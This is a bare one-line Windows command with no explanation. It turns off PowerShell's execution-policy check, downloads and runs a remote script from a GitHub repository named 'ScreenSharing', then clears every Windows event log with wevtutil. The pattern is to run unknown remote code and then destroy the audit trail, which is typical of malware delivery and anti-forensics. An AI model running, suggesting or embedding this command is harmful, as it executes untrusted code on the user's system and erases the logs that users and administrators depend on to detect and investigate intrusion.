```
powershell Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass && powershell Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/qu1ckpots/ScreenSharing/refs/heads/main/ps/Hotspots.ps1) & timeout /t 4 & for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
```
